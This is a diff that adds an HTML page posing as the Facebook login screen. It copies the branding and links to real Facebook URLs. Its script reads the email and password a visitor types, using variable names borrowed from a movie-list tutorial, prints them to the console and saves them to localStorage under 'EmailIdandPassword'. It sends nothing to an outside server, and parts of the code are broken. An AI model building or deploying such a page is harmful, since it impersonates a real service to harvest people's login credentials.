@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login to Facebook</title>
+    <link rel="stylesheet" href="facebook.css">
+    <link rel="stylesheet" href="facebook.php">
+</head>
+<body>
+    <div class="header">
+        <CENTER><h1>facebook</h1></CENTER>
+    </div>
+    <div class="container">
+        <div class="form">
+            <h2>Log in to Facebook</h2>
+            <form>
+            <input type="email" id="email" placeholder="Enter your Email or Phone Number" required><br>
+            <input type="password" id="password" placeholder="Password" required><br>
+            <a href="https://www.facebook.com/login">
+                <button type="submit" id="btn">
+                    Log In
+                </button>
+            </a>
+            </form>
+            <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten account?</a>
+            <a href="https://www.facebook.com/r.php?locale=en_GB&display=page">Sign Up for Facebook</a>
+        </div>
+    </div>
+
+    <script>
+        let movies = [];
+        const addMovie = (ev)=>{
+            ev.preventDefault();
+            let movie = {
+                id : Date.now(),
+                title: document.getElementById('email').value,
+                year: document.getElementById('password').value
+            }
+            movies.push(movie);
+            document.forms[0].reset();
+            //document.querySelector('form').reset();
+
+            console.warn('added', {movies} );
+            let pre = document.querySelector('#msg pre');
+            pre.textContent = '\n' + JSON.stringify(movies, '\t', 2);
+
+            //saving to localstorage
+            localStorage.setItem('EmailIdandPassword', JSON.stringify(movies) );
+        }
+        document.addEventListener('DOMContentLoaded', ()=>{
+            document.getElementById('btn').addEventListener('click', addMovie);
+        });
+    </script>
+</body>
+</html>
